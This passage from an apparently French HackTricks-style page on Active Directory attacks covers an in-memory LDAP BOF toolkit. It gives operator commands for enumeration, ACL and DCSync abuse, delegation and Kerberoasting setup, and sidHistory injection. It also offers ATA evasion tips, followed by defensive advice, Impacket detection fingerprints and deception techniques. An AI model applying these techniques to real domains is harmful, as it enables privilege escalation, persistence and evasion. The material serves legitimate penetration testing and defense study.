La [collection LDAP BOF](https://github.com/P0142/LDAP-Bof-Collection) réimplémente les primitives LDAP de type bloodyAD sous la forme de Beacon Object Files x64, qui s’exécutent entièrement dans un implant sur l’hôte (par exemple, Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis exécutent `ldap <subcommand>` depuis le beacon. Tout le trafic utilise le contexte de sécurité de la session ouverte via LDAP (389), avec signature/scellement, ou LDAPS (636), avec approbation automatique du certificat. Aucun proxy SOCKS ni artefact sur disque n’est donc nécessaire.<sup>[[4]](#references)</sup>

### Énumération LDAP côté implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` et `get-groupmembers` résolvent les noms courts et chemins d’OU en DN complets, puis récupèrent les objets correspondants.
- `get-object`, `get-attribute` et `get-domaininfo` récupèrent des attributs arbitraires (y compris les descripteurs de sécurité) ainsi que les métadonnées de la forêt et du domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` et `get-rbcd` exposent directement depuis LDAP les candidats au roasting, les paramètres de délégation et les descripteurs existants de [délégation contrainte basée sur les ressources](resource-based-constrained-delegation.md).
- `get-acl` et `get-writable --detailed` analysent la DACL pour répertorier les trustees, les droits (GenericAll/WriteDACL/WriteOwner/écritures d’attributs) et l’héritage, ce qui permet d’identifier immédiatement des cibles pour une escalade de privilèges via ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitives d’écriture LDAP pour l’escalade et la persistance

- Les BOF de création d’objets (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l’opérateur de préparer de nouveaux principaux ou comptes machine partout où des droits existent sur une OU. `add-groupmember`, `set-password`, `add-attribute` et `set-attribute` permettent de détourner directement des cibles dès que des droits WriteProperty sont trouvés.
- Les commandes axées sur les ACL, telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` et `add-dcsync`, transforment les droits WriteDACL/WriteOwner sur n’importe quel objet AD en réinitialisations de mots de passe, contrôle de l’appartenance à des groupes ou privilèges de réplication DCSync, sans laisser de traces PowerShell/ADSI. Les commandes `remove-*` correspondantes nettoient les ACE injectées.

### Délégation, roasting et abus de Kerberos

- `add-spn`/`set-spn` rendent immédiatement un utilisateur compromis vulnérable au Kerberoasting ; `add-asreproastable` (bascule UAC) le rend vulnérable à l’AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modifient `msDS-AllowedToDelegateTo`, les indicateurs UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, permettant des voies d’attaque par délégation contrainte/non contrainte/RBCD et supprimant le besoin de PowerShell distant ou de RSAT.

### Injection de sidHistory, déplacement d’OU et façonnage de la surface d’attaque

- `add-sidhistory` injecte des SID privilégiés dans l’historique SID d’un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), assurant un héritage d’accès furtif entièrement via LDAP/LDAPS.
- `move-object` modifie le DN/OU d’ordinateurs ou d’utilisateurs, permettant à un attaquant de placer des ressources sous des droits délégués avant d’utiliser `set-password`, `add-groupmember` ou `add-spn`. Voir [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) pour les autorisations de déplacement et les vérifications d’héritage.
- Les commandes de suppression à portée restreinte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un retour arrière rapide après la collecte des identifiants ou la mise en place de la persistance par l’opérateur, en réduisant au minimum la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Quelques défenses générales

[**En savoir plus sur la protection des identifiants ici.**](../stealing-credentials/credentials-protections.md)

### **Mesures défensives pour la protection des identifiants**

- **Restrictions pour les Domain Admins** : Il est recommandé de n’autoriser les Domain Admins à se connecter qu’aux contrôleurs de domaine, afin d’éviter leur utilisation sur d’autres hôtes.
- **Privilèges des comptes de service** : Les services ne doivent pas être exécutés avec des privilèges Domain Admin (DA), afin de préserver la sécurité.
- **Limitation temporaire des privilèges** : Pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être fait ainsi : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Atténuation des attaques par relais LDAP** : Auditez les ID d’événement 2889/3074/3075, puis imposez la signature LDAP et le channel binding LDAPS sur les DC/clients pour bloquer les tentatives d’attaque MITM/relais LDAP.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Empreinte au niveau protocole de l’activité Impacket

Pour détecter les techniques AD courantes, **ne vous fiez pas uniquement aux artefacts contrôlés par l’opérateur**, tels que les binaires renommés, les noms de services, les fichiers batch temporaires ou les chemins de sortie. Établissez une référence du trafic [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC et WMI généré par des clients Windows légitimes, puis recherchez les **particularités d’implémentation** qui persistent même après modification par l’opérateur de `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Indicateurs autonomes à forte confiance** (après validation par rapport à votre propre référence) :
  - DCE/RPC authentifié avec `auth_context_id = 79231 + ctx_id`
  - Bourrage d’authentification DCE/RPC rempli de `0xff`
  - Liaisons Kerberos LDAP plaçant un `AP-REQ` Kerberos brut directement dans le `mechToken` SPNEGO
  - Requêtes de négociation SMB2/3 avec des valeurs `ClientGuid` d’apparence ASCII
  - `IWbemLevel1Login::NTLMLogin` WMI utilisant l’espace de noms non standard `//./root/cimv2`
  - Valeurs de nonce Kerberos codées en dur
- **À privilégier comme indicateurs de corrélation/score** :
  - Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituelles/manquantes, ou ordre des etype dans les TGS-REQ différent de celui de Windows natif
  - Messages NTLM Type 1 sans informations de version ou messages Type 3 avec des noms d’hôte nuls
  - NTLMSSP brut transporté dans DCE/RPC plutôt que dans SPNEGO, absence de trailers de vérification DCE/RPC, ou discordances entre les OID SPNEGO/Kerberos
  - Plusieurs de ces caractéristiques provenant du même hôte/utilisateur/de la même session/période sont bien plus significatives qu’un seul champ peu fiable
- **À utiliser comme enrichissement, pas comme alertes autonomes** :
  - Noms de fichiers par défaut, chemins de sortie, noms de services aléatoires, noms de fichiers batch temporaires, noms de comptes d’ordinateur par défaut et chaînes HTTP/WebDAV/RDP/MSSQL spécifiques aux outils
  - Ces éléments sont faciles à modifier pour les opérateurs ; ils servent surtout à expliquer pourquoi un regroupement inter-protocoles est suspect
- **Remarques opérationnelles** :
  - Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou une visibilité côté service
  - Validez-les sur des clients Samba/Linux, des appliances et des logiciels anciens avant de les convertir en alertes
  - Faites passer les détections de l’enrichissement à la recherche proactive, puis aux alertes, à mesure que vous gagnez en confiance dans votre référence

### **Mise en œuvre de techniques de déception**

- La mise en œuvre de techniques de déception consiste à placer des pièges, comme des utilisateurs ou des ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n’expirent jamais ou le statut Trusted for Delegation. Une approche détaillée consiste à créer des utilisateurs avec des droits spécifiques ou à les ajouter à des groupes à privilèges élevés.<sup>[[2]](#references)</sup>
- Voici un exemple pratique utilisant des outils tels que : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Pour en savoir plus sur le déploiement de techniques de déception, consultez [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Détection des leurres**

- **Pour les objets utilisateur** : Les indicateurs suspects incluent un ObjectSID atypique, des connexions peu fréquentes, des dates de création et un faible nombre de mots de passe incorrects.
- **Indicateurs généraux** : La comparaison des attributs d’objets leurres potentiels avec ceux d’objets authentiques peut révéler des incohérences. Des outils tels que [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à repérer ces leurres.

### **Contournement des systèmes de détection**

- **Contournement de la détection Microsoft ATA** :
  - **Énumération des utilisateurs** : Évitez l’énumération des sessions sur les contrôleurs de domaine pour empêcher la détection par ATA.
  - **Usurpation de tickets** : L’utilisation de clés **aes** pour créer des tickets aide à éviter la détection en évitant de rétrograder vers NTLM.
  - **Attaques DCSync** : Il est conseillé de les exécuter depuis un hôte qui n’est pas un contrôleur de domaine pour éviter la détection par ATA, car une exécution directe depuis un contrôleur de domaine déclenchera des alertes.

## References

- [1] [Guide d’attaque des relations d’approbation de domaine](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forger des relations d’approbation pour la déception dans Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin à Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Collection LDAP BOF – Boîte à outils LDAP en mémoire pour l’exploitation d’Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Utiliser les hachages NTLM comme liste de mots](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (labo AD NetExec) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analyse approfondie d’Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon : prise de contrôle de comptes Active Directory via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Gérer les modifications des connexions de canal sécurisé Netlogon associées à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Un voyage à la découverte des interfaces Null Session et MS-RPC oubliées](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Le filtrage SID comme frontière de sécurité entre domaines ? (Partie 4) - Recherche sur le contournement du filtrage SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Le filtrage SID comme frontière de sécurité entre domaines ? (Partie 5) - Attaque de confiance Golden GMSA - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Le filtrage SID comme frontière de sécurité entre domaines ? (Partie 6) - Attaque de confiance par modification du schéma - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA à EA avec ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Passer des administrateurs d’un domaine enfant aux administrateurs d’entreprise en 5 minutes en abusant d’AD CS : suite](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE dans sa manche : conception de portes dérobées DACL pour Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Code source du module pre2k de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - Attribut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
